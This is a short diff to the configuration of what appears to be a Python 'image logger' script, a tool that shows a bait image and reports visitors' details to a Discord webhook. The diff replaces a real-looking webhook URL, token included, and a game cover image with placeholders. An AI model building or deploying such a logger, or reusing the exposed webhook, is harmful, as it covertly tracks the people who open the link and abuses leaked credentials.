@@ -7,8 +7,8 @@ import traceback, requests, base64, httpagentparser
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1131989215194923048/I3ECtzOeatiVH2f6IPB9jT4kmInhADxFSwWKHL1FHzTw2jJBVRcVwZrozbcvRcZV3IQU",
-    "image": "https://images.crazygames.com/games/krunker-io/cover-1591336739727.png", # You can also have a custom image by using a URL argument
+    "webhook": "WEBHOOK_LINK",
+    "image": "IMAGE_LINK or IMAGE_PATH", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
